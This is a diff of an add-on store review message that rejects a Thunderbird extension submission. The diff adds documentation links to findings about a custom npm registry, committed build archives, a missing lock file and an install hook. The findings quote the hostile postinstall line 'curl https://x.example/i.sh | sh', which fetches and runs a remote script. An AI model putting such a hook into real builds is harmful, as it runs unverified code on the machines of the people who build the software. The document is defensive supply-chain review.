@@ -3,6 +3,7 @@
 Thank you for your submission. We appreciate the effort you’ve put into creating this add-on. However, it cannot be accepted and hosted on addons.thunderbird.net in its current form. The following findings caused the submission to be rejected:
 
 1) The following .npmrc file(s) set a package registry, which is not allowed. Remove the registry setting - the build must resolve every dependency from the default public npm registry (registry.npmjs.org). A custom registry pulls the declared package names from an undeclared source, making package.json and the lock file a decoy.
+Read more: https://webextension-api.thunderbird.net/en/mv3/guides/sourceCodeSubmission.html
  - [SCA] .npmrc:1 - https://npm.internal.example/
 
 2) The following committed build artifact(s) are not allowed. A built archive (a .xpi/.zip) is produced from the source during the build and must never be part of the submission, where its bytes cannot be verified against what the build produces. Remove them.
@@ -14,6 +15,7 @@ Thank you for your submission. We appreciate the effort you’ve put into creati
  - [SCA] tools/node_modules
 
 4) The submitted source includes no npm or pnpm lock file. These lock files are needed to ensure reproducibility (via npm ci or pnpm install --frozen-lockfile). Please commit the lock file created by your package manager (package-lock.json for npm, pnpm-lock.yaml for pnpm). The supported package managers are npm and pnpm.
+Read more: https://webextension-api.thunderbird.net/en/mv3/guides/sourceCodeSubmission.html
  - [SCA] package.json
 
 [XPI] = source file in the submitted XPI
@@ -36,6 +38,7 @@ Continue manual review for the following checks:
    by curl or wget, a download-and-run, or a git clone of an unpinned repo.
 Suggested verdict: error
 Suggested response: The package.json declares an npm install lifecycle hook that fetches or executes remote code when the dependencies are installed. Every part of the build must come only from the dependencies declared in package.json/lock. Please remove the remote fetch or execution from the hook.
+Read more: https://webextension-api.thunderbird.net/en/mv3/guides/sourceCodeSubmission.html
  - [SCA] package.json:6 - postinstall: curl https://x.example/i.sh | sh
  - [SCA] package.json:7 - prepare: node tools/gen.js
 
